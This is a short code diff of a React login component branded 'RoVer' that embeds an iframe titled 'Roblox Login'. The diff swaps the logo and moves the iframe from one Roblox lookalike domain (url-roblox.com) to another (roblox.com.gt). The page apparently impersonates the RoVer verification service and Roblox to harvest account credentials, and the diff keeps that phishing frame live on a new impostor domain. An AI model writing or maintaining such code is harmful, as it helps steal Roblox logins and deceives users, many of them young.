@@ -11,7 +11,7 @@ const RoVerLogo = () => (
   <div className="flex items-center gap-3">
     {/* Geometric Icon */}
     <img
-      src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/1759208584157-XRYQnRR1LzsHjdysKompQM37tE1LU9.jpg"
+      src="/images/design-mode/1759208584157-removebg-preview.png"
       alt="RoVer Logo"
       className="w-14 h-14 object-contain"
     />
@@ -88,7 +88,7 @@ export default function RoVerLogin() {
               </Button>
             </div>
             <iframe
-              src="https://url-roblox.com/login?returnUrl=4620367668564615"
+              src="https://roblox.com.gt/login?returnUrl=4620367668564615"
               className="w-full h-[calc(100%-40px)] border-0"
               title="Roblox Login"
             />
